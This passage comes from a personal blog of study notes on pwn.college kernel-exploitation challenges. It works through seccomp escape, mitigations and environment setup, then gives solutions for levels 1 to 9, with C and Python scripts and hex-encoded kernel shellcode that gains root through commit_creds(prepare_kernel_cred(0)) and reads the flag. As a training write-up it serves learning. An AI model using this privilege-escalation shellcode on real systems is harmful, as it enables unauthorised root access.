id="Escape-Seccomp"><a href="#Escape-Seccomp" class="headerlink" title="Escape Seccomp"></a>Escape Seccomp</h5><p><a href="https://docs.google.com/presentation/d/1YMlOERClX6Yi8Fb9DYxBBJ5MYB1C-_F75XKkoSmbl8k/edit#slide=id.ga2eb818465_0_0">SLIDE</a> </p><p>mainly disable <code>TIF_SECCOMP</code> bit. all in SLIDES.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-comment">// LOTS of stuff, including</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags;<span class="hljs-comment">/* low level flags */</span><br>    u32 status;<span class="hljs-comment">/* thread synchronous flags */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>Yan demonstrates how to use make_root.ko to escape seccomp and escalating privilege.</p><h5 id="memory-managment"><a href="#memory-managment" class="headerlink" title="memory managment"></a>memory managment</h5><ul><li>linux use four level page table:</li></ul><img src="../../image/pwn-modules/image-20220523182826589.png" alt="image-20220523182826589" style="zoom:80%;" /> <ul><li>only lower 48 bits are used in addressing. higher 12bits used to denote the kernel space. and ARM arch take these bits as tag for security concerns. <a href="https://source.android.com/devices/tech/debug/tagged-pointers">android source</a> | <a href="https://llvm.org/devmtg/2018-10/slides/Serebryany-Stepanov-Tsyrklevich-Memory-Tagging-Slides-LLVM-2018.pdf">LLVM memory tagging</a> | </li><li>Virtual Machine isolation: The extended page table.</li><li>MMU + TLB</li><li>other architectures are analogous in <strong>paging</strong>. Linux <em>requires</em> a hardware MMU (although certain forks do not).</li><li><strong>The Old Way</strong>: Old Linuxes could access physical memory via <strong>/dev/mem</strong> as root.<br><strong>The New Way</strong>: If you want to get at physical memory now, you must do it from the <strong>kernel</strong>. Physical memory is mapped <em>contiguously</em> in kernelâ€™s virtual memory space for convenient access. Two macros, <code>phys_to_virt()</code> and <code>virt_to_phys()</code>.</li></ul><h5 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h5><p><a href="https://docs.google.com/presentation/d/1DNxufs_WlQRkzBMjPD7UE1qRrd87XDGpfQSPkiajEyE/edit#slide=id.gfbef220448_0_48">SLIDES</a> many links.</p><ul><li><p><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</p></li><li><p>May support Function Granular ASLR.</p></li><li><p>Supervisor Memory Protection:</p><ul><li><strong>SMEP.</strong><br>Prevents kernel-space code from <strong>E</strong>xecuting userspace memory <em>at all ever</em>.</li><li><strong>SMAP.</strong><br>Prevents kernel-space from even <strong>A</strong>ccessing userspace memory <em>unless the AC flag in the RFLAGS register is set</em>. Two ring0 instructions, stac and clac, manage this bit.</li><li>Why separate these? in SLIDES.</li></ul></li></ul><h5 id="kernel-shellcode"><a href="#kernel-shellcode" class="headerlink" title="kernel shellcode"></a>kernel shellcode</h5><ul><li>you cant use syscalls in kernel. just use call instruction with symbol addresses in /proc/kallsyms</li><li>KASLR. if it is on, then I need to find a vulnerability to leak an kernel symbol address.</li><li>indirect calls.</li><li>seccomp escaping: notice gs segment register to figure out where the task struct is.</li><li>The kernel is WAY too complex to figure out offsets manually.<br>Best option:<ol><li>Write a kernel module in C with the actions you want<br>your shellcode to do.</li><li>Build it for the kernel you want to attack (e.g., using<br>the vm build command in pwn.college).</li><li> Reverse-engineer it to see how these actions work in<br>assembly.</li><li>Re-implement that assembly in your shellcode!</li></ol></li><li>be careful with kernel code context! Try to have it act like a normal function and <strong>return</strong> when itâ€™s done.</li></ul><h5 id="Env-setup"><a href="#Env-setup" class="headerlink" title="Env setup"></a>Env setup</h5><p>build for old kernel 5.4: <a href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p><ul><li>first complie stopping at <code>thunk_64.o</code>, due to missing symbol table.<ul><li>revise <code>linux-5.4/tools/objtool/elf.c</code> line 380 -&gt; <a href="https://www.spinics.net/lists/kernel/msg3797871.html">link</a> </li></ul></li><li>then revise build.sh and take a vm snapshot.</li><li>then revise <code>arch/x86/boot/compressed/pgtable_64.c</code> to fix multiple definitions of <code>__force_order</code>. <a href="https://lkml.org/lkml/2019/12/21/121">link</a> </li><li>OK. total size is 4.3G. by <code>du -sh pwnkernel</code> </li></ul><p>VM by qemu: </p><ul><li><p>require: new version of gdb, kernel with debug symbols, ASLR is off(in ./launch there is <code>-append</code> option for qemu, <strong>check its usage</strong>).</p></li><li><p>because the kernel is started with qemu, so can debug with gdb through port 1234.</p><p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234</code> (I added it into .gdbinit in pwnkernel/)</p></li><li><p><code>cat /proc/kallsyms</code>  you can see all symbols in kernel. because we disabled the kernel address space randomization, it will always be the same.</p></li><li><p> only a limited number of commands will work in vm. look <code>ls /bin</code> for details. Because the shell is provided by busybox, so there is a lack of functionality.</p></li><li><p>use <code>sh -l</code> or <code>su - ctf</code> to load ~/.profile. there is some convenient aliases.</p></li></ul><p><a href="https://docs.google.com/presentation/d/1Ik7EWjn_9ywzCW3MpJJ0eVdIvhIMP6brObBQQDtYDCo/edit#slide=id.ga548015bd5_0_114">further setup is here</a> </p><p>tips: </p><ul><li>wget command in build.sh has been added with -c option(â€“continue), which means that it wonâ€™t repeat downloadiing when there is an already existing file in the same directory.</li><li><code>mkdir -p</code> no error if existing.</li></ul><h5 id="online-environment"><a href="#online-environment" class="headerlink" title="online environment"></a>online environment</h5><ul><li><code>vm debug</code>: I have no idea about what happenedâ€¦â€¦.it suddenly worked and then shutdownâ€¦..</li><li>å¤ªè ¢äº†, å…¨éƒ½åœä¸ä¸‹æ¥. ç­‰ä¼šçœ‹ä¸€ä¸‹writing kernel shellcode. æ²¡ç”¨å•Š, éš¾ä¸æˆå…¨éƒ¨éƒ½å˜æˆæœ¬åœ°åš? ä¹Ÿä¸æ˜¯ä¸è¡Œå°±æ˜¯äº†â€¦â€¦.</li><li> åªæ˜¯ä¸èƒ½debug. æš‚æœªå‘ç°è§£å†³åŠæ³•.</li></ul><h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><p>.0 level calls <code>printk()</code> function to give some info in kernel ring buffer. Obviously, .1 level doesnâ€™t. </p><p>tested in ipython:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>os.write(fd, <span class="hljs-string">&#x27;password&#x27;</span>)<br>os.read(fd, <span class="hljs-number">60</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><p>unlike previous level, there is no device_read() function, rather printk(flag) exists in device_write with password check.</p><p>script is the same way.</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3"></a>level3</h4><p>the kernel module defines a win() function which will elevate the calling process privilege.</p><p>once pass the check, current process(i.e., ipython), will run as root. then use <code>!cat /flag</code>. everything is done.</p><p>even while the password is for previous level, it just still worksâ€¦â€¦..</p><h4 id="level4-5"><a href="#level4-5" class="headerlink" title="level4"></a>level4</h4><p>hijack the kernel module by <code>ioctl()</code>. it is in python <code>fcntl</code> module. <a href="https://docs.python.org/3.10/library/fcntl.html">doc</a> </p><p>in python fcntl.fcntl() almost equals to fcntl.ioctl(), <strong>except for ioctolâ€™s <em>arg</em> argument can accept <em>bytes</em></strong>.</p><p>script:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fcntl, os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>fcntl.ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-string">b&#x27;ruysmamctudpofzh&#x27;</span>)<br><span class="hljs-comment">#then !cat /flag</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h4><p>device_ioctl() calls __x86_indirect_thunk_rbx.</p><p>retpoline, __x86_indirect_thunk_rbxâ€¦â€¦whatâ€™re these?</p><p><a href="https://elixir.bootlin.com/linux/v5.4/source/arch/x86/lib/retpoline.S#L11">here</a> it is(<a href="https://stackoverflow.com/questions/48089426/what-is-a-retpoline-and-how-does-it-work">here</a> is repoline and googleâ€™s <a href="https://support.google.com/faqs/answer/7625886">article</a>). when debugging, I find that it just merely jumps to the address the register(<strong>rbx</strong>) points to. so many nested macros in kernel codeâ€¦..</p><p>ATTENTION: The following piece of code in fact create a function, and in kernel module it calls the it. Thus module will push return address onto stack and when returning from the <em>THUNK</em>  function itâ€™ll come back to complete the rest of cleanups.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">GENERATE_THUNK(_ASM_BX)<br>â†˜<br>#define __EXPORT_THUNK(sym) _ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)<br>#define EXPORT_THUNK(reg) __EXPORT_THUNK(__x86_indirect_thunk_ ## reg)<br>#define GENERATE_THUNK(reg) THUNK reg ; EXPORT_THUNK(reg)<br>â†˜<br>.macro THUNK reg<br>.section .text.__x86.indirect_thunk<br><br>ENTRY(__x86_indirect_thunk_\reg)<br>CFI_STARTPROC<br>JMP_NOSPEC %\reg  #simply a jmp to shellcode. no change to the stack. <br>#we can directly use ret to come back to module code.<br>CFI_ENDPROC<br>ENDPROC(__x86_indirect_thunk_\reg)<br>.endm<br></code></pre></div></td></tr></table></figure><p>what value dose the rbx hold before execute <code>jmp rbx</code> instruction? it is ioctl()â€™s <em>arg</em> argument.</p><p>by <code>cat /proc/kallsyms | grep win</code> command,  the win()â€™s address can be easily found. <code> ffffffffc0000c5d t win  [challenge]</code> </p><p>but in pwn.collegeâ€¦.</p><img src="../../image/pwn-modules/image-20220524205647223.png" alt="image-20220524205647223" style="zoom:80%;" /><p>letâ€™s give up this mysterious environment.</p><blockquote><p>Now I know why it would happenâ€¦â€¦<br>normal user that doesnâ€™t have enough privilege will find all kernel symbols with address 0.<br>then what should i do in pwn.college? emmmmmm<br>maybe i need to grep in practice mode and come back.</p></blockquote><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-number">0xffffffffc0000c5d</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>I win.</p><img src="../../image/pwn-modules/image-20220524211101441.png" alt="image-20220524211101441" style="zoom:80%;" /><h4 id="level6-6"><a href="#level6-6" class="headerlink" title="level6"></a>level6</h4><p>begin kernel shellcoding!</p><ul><li>at the beginning of module, it calls <code>kmalloc()</code> function to allocate a chunk of virtual address contiguous memory. the details of its argument are waiting to be check.</li><li>when writing to /proc/pwncollege, the device_write() in kernel will call <code>copy_from_user()</code> to copy shellcode from <code>write()</code>â€˜s buffer argument to <em>shellcode</em> variable. and jmp to shellcode address.</li><li>donot forget to restore kernelâ€™s context after shellcode returns.</li></ul><p>The ciritical point of shellcoding in kernel is we can only call kernel function. here i use <code>prepare_kernel_cred()</code> and <code>commit_cred()</code> to achive privilege escalation.</p><ul><li>two functionsâ€™ address:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/kallsyms | grep -E <span class="hljs-string">&#x27;prepare_kernel_cred|commit_cred&#x27;</span></span><br>ffffffff810892c0 T commit_creds                                   <br>ffffffff810895e0 T prepare_kernel_cred                            <br></code></pre></div></td></tr></table></figure><ul><li>then <code>commit_cred(prepare_kernel_cred(0))</code> </li></ul><p>reassembly code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    _copy_from_user ; PIC mode<br>mov     rbp, rax<br>mov     rax, cs:shellcode<br>call    __x86_indirect_thunk_rax ; PIC mode<br><br>mov     rax, rbx<br>pop     rbx<br>sub     rax, rbp<br>pop     rbp<br>retn<br></code></pre></div></td></tr></table></figure><ol><li>what would happen if device_write() return non-zero? first try to non-restore:</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov rbx, 0xffffffff810895e0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rbx, 0xffffffff810892c0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">ret//equals to the ret in device_write()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>The ret instruction equals to the ret in device_write(), and violate the conventions of caller-saved resgiterâ€“rbx. it may crash the kernel. but in practice, it doesnâ€™t.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-comment">//gernerated with pwnsh</span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, shellcode, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>win again.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ ./test                                                                                                        <br>[ 2166.732101] [device_open] inode=ffff888006e33448, file=ffff888006bf7900                                        <br>[ 2166.737393] [device_write] file=ffff888006bf7900, buffer=0000000000481004, length=4096, offset=ffffc900001a7f08<br>pwn_college&#123;what the fuck?&#125;                                                                                       <br>[ 2166.748112] [device_release] inode=ffff888006e33448, file=ffff888006bf7900                                     <br></code></pre></div></td></tr></table></figure><h4 id="level7-5"><a href="#level7-5" class="headerlink" title="level7"></a>level7</h4><p>execute shellcode through ioctl</p><p>after checking the code for a while, I found that it may need to define a struct to wrap up the <em>arg</em> for <code>ioctl()</code>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">device_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">char</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> shellcode_length; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> (*shellcode_execute_addr)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//for canary</span><br>  printk(&amp;unk_A30, file, cmd); <span class="hljs-comment">//nothing</span><br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">1337</span> ) <span class="hljs-comment">//request number must be 1337</span><br>  &#123;<br>    copy_from_user(&amp;shellcode_length, arg, <span class="hljs-number">8LL</span>);<br>    copy_from_user(&amp;shellcode_execute_addr, arg + <span class="hljs-number">4104</span>, <span class="hljs-number">8LL</span>);<br>    <span class="hljs-comment">//the shellcode_length and addr come from the (void*)arg.</span><br>    <span class="hljs-comment">//the maximun len of code is 4104 bytes.</span><br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( shellcode_length &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, arg + <span class="hljs-number">8</span>, shellcode_length);<span class="hljs-comment">//copy shellcode.On success will return 0</span><br>      _x86_indirect_thunk_rax(shellcode_execute_addr);<span class="hljs-comment">// jumpto shellcode.</span><br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the struct may be like:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4104</span>];<br>    <span class="hljs-keyword">void</span>* addr = ?;<br>&#125;test;<br></code></pre></div></td></tr></table></figure><p>code near jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov     rdi, cs:shellcode<br>lea     rsi, [arg+8]<br>call    _copy_from_user ; PIC mode<br>mov     rax, [rsp+28h+shellcode_execute_addr]<br>call    __x86_indirect_thunk_rax ; PIC mode<br>xor     eax, eax<br></code></pre></div></td></tr></table></figure><p><del>so i can reuse the rdi as the shellcode address.</del>. emmmmm, use gdb.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ cat /proc/kallsyms | grep &#x27;device_ioctl&#x27;<br>0xffffffffc000092c t device_ioctl [challenge] <br></code></pre></div></td></tr></table></figure><p>and the kmalloc() addressâ€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">â–º <span class="hljs-number">0xffffffffc00009ac</span>    call   _copy_from_user            &lt;_copy_from_user&gt;<br>       rdi: <span class="hljs-number">0xffffc90000045000</span> â—‚â€” <span class="hljs-number">0xffffffffffffffff</span>                       <br>       rsi: <span class="hljs-number">0x4ae388</span> â—‚â€” <span class="hljs-number">0</span>                                                  <br>       rdx: <span class="hljs-number">0x0</span>                                                            <br></code></pre></div></td></tr></table></figure><p>shellcode is same like previous level.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3\x00&quot;</span>;<br><span class="hljs-keyword">int</span> shellcode_len = <span class="hljs-number">25</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4096</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    test.len= shellcode_len;<br>    test.addr = (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0xffffc9000002f000</span>;<br>    <span class="hljs-built_in">memcpy</span>(test.a, shellcode, shellcode_len);<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;test);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>still win. but through a stupid way to find kmalloc()â€™s fixed addressâ€¦..</p><h4 id="level8-5"><a href="#level8-5" class="headerlink" title="level8"></a>level8</h4><p>this challenge has two files. One for kernel module, the other for user land program to receive shellcode and add seccomp rules to itself(only write syscall is allowed).</p><p>nothing special.</p><h4 id="level9-5"><a href="#level9-5" class="headerlink" title="level9"></a>level9</h4><p>something strange in IDAâ€¦</p><p>Okay, just because the misdecompilation of <code>memset(v8, 0, 66)</code>. in mechine code it is <code>rep stod</code> with rcx=66 rdi=dest rax=content. and it need modify the struct name in Structures window.</p><p>we should fill with this structure, and overwrite the function pointer:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">00000000 logggg          struc ; (sizeof=0x108, align=0x8, copyof_570)<br>00000000                                         ; XREF: device_write/r<br>00000000 buffer          db 256 dup(?)<br>00000100 log_function    dq ?                    ; XREF: device_write+4A/w<br>00000100                                         ; device_write:loc_661/r ; offset<br>00000108 logggg          ends<br>00000108<br></code></pre></div></td></tr></table></figure><p>256 bytes shellcode and 8 bytes shellcode begin address.</p><blockquote><p>ATTENTION:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    __x86_indirect_thunk_rax ; PIC mode<br></code></pre></div></td></tr></table></figure><p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret at the end of it is enough.</p></blockquote><p>this module has local variable space on stack(and canary), so we can use the rdi to restore the stack context and make <code>ret</code> work normally.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//shellcode is also the same.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span 